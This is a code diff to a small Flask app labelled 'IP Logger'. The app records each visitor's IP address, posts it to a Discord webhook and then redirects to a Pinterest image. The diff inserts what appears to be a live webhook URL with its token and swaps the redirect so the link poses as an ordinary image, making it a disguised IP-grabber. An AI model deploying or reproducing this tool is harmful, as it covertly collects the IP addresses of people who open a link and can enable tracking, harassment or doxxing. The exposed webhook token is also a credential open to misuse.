@@ -6,7 +6,7 @@ import requests
 app = Flask(__name__)
 
 def send_ip(ip, date):
-    webhook_url = "WEBHOOK_URL_HERE"
+    webhook_url = "https://discordapp.com/api/webhooks/1478199953821143122/oDOhn8xMUBCynaZNQTaSEJMn6PH6Mg1gTw4dG_NiY8Hs7aiwYqCWdBhoxBxBRrauf32Z"
     data = {
         "content": "",
         "title": "IP Logger"
@@ -26,7 +26,7 @@ def index():
 
     send_ip(ip, date)
 
-    return redirect("https://google.com")
+    return redirect("https://i.pinimg.com/736x/6a/bc/f8/6abcf84ac150893bfaad32730c3a99a8.jpg")
 
 
 
